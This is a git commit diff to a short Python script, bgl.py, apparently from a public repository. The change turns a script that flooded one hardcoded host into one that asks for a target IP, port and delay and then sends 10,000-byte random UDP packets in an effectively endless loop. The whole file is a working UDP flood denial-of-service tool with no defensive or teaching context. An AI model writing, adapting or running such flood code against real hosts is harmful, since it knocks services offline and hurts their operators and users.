27994758eb5ca64aa8a17b8d3081f0ad7716c647
bagol12334 <101828171+bagol12334@users.noreply.github.com>
2022-06-27 02:31:14 +0700

    Update bgl.py

--- bgl.py
+++ bgl.py
@@ -1,11 +1,15 @@
 import socket, random, time
 
-sleep = "0.05"
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-socket.socket(socket.AF_INET, socket.SOCK_DGRAM).connect(("dststx.xyz", "80"))
+ip = input("Enter Target IP: ")
+port = int(input("Enter Target Port: "))
+sleep = float(input("Sleep: "))
+
+s.connect((ip, port))
 
 for i in range(1, 100**1000):
-    socket.socket(socket.AF_INET, socket.SOCK_DGRAM).send(random._urandom(10)*1000)
-    print(f"Send: {i}", end='\r')
+    s.send(random._urandom(10)*1000)
+    #print(f"Send: {i}", end='\r')
     time.sleep(sleep)
     
